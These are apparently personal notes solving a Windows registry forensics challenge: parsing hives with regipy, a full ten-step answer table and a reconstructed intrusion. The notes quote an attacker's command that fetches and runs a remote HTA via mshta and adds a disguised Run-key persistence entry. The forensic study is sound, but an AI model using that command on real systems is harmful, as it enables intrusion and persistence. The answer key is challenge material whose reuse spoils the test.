# Disk Analysis - Windows - Registers — notes

Platform: Root-Me Pro | Category: Forensic / Disk Analysis | 10 steps
Provided: `Disk_Analysis_Windows_Registers.zip` (KAPE-style triage image), tool hint: Autopsy

Reconstructed 2026-08-10 from session transcripts + re-verified against the hives,
because the original solve sessions never wrote notes.

## Setup

```bash
unzip -q Disk_Analysis_Windows_Registers.zip -d extracted
pip install --break-system-packages regipy     # Autopsy not needed; parse hives directly
```

Hives present:

```
C/Windows/System32/config/{SOFTWARE,SYSTEM,SAM}
C/Users/Michel/NTUSER.DAT
C/Users/Default/NTUSER.DAT
C/Windows/ServiceProfiles/{LocalService,NetworkService}/NTUSER.DAT
```

`regipy` beats the GUI here — every answer is a single key lookup, and scripting it
makes the whole thing reproducible.

## Findings per step

| # | Question | Key | Answer |
|---|---|---|---|
| 1 | Machine name | `SYSTEM\ControlSet001\Control\ComputerName\ComputerName` | `DESKTOP-13VQIIJ` |
| 2 | OS version | `SOFTWARE\...\CurrentVersion` → `ProductName` / `DisplayVersion` | Windows 10 Pro, 22H2 |
| 3 | Build number | same key → `CurrentBuild` (`UBR` = 2965) | `19045` |
| 4 | Install date | same key → `InstallDate` = 1777030318 (epoch) | 2026-04-24 11:31:58 UTC |
| 5 | Recent PDF (Michel) | `NTUSER\...\Explorer\RecentDocs\.pdf` | `EN - Volatility cheatsheet v2.4.pdf` |
| 6 | Suspicious Run-dialog command | `NTUSER\...\Explorer\RunMRU` | `mshta.exe` |
| 7 | File set to run at logon | `NTUSER\...\CurrentVersion\Run` | `C:\ProgramData\Updater.ps1` |
| 8 | The leftover registry entry | same key, **value name** | `OneDrive Updater` |
| 9 | Suspicious account | `SAM\Domains\Account\Users\Names` | `WD4GUti1ityAccount` |
| 10 | Bernard's failed logins | SAM RID 0x3EA → `failed_login_count` | `10` |

## The attack, reconstructed

Single `RunMRU` entry (slot `a`) holds the whole thing:

```
cmd /c echo powershell.exe mshta http://10.10.10.10/rmpflags.hta > C:\ProgramData\Updater.ps1
  && reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
     /v "OneDrive Updater" /t REG_SZ /d "C:\ProgramData\Updater.ps1" /f
```

So: typed by hand into Win+R, writes a one-line PowerShell dropper to
`C:\ProgramData\Updater.ps1` that pulls an HTA from `10.10.10.10`, then registers it
for persistence under a name that reads as legitimate next to the real `OneDrive` entry.

`Updater.ps1` is **not** on disk in the triage image — deleted post-execution or
quarantined. The Run key entry is the "leftover" Step 7 asks about.

Timeline anchor: RunMRU activity ~09:43–09:52, and `WD4GUti1ityAccount` was created
2026-04-26 09:50:46 — same window.

## Dead ends (Step 8)

Burned several attempts submitting **key paths** before realising the question wanted
the **value name**:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` ❌
- `Software\Microsoft\Windows\CurrentVersion\Run` ❌
- `OneDrive Updater` ✅

## Gotchas

- The `RunMRU` value has a literal trailing `\1` (bytes `0x5c 0x31`) — Windows' MRU slot
  marker, not a control character. Step 6 wanted just `mshta.exe`, so it didn't bite here,
  but it cost time when guessing at full-string answers.
- `ProductName` reads `Windows 10 Pro` and build 19045 confirms genuine Win10 22H2.
- `WD4GUti1ityAccount` vs `WDAGUtilityAccount` — `A`→`4`, `l`→`1`. Trivial to miss in a
  user list; sort the names and compare adjacent entries.
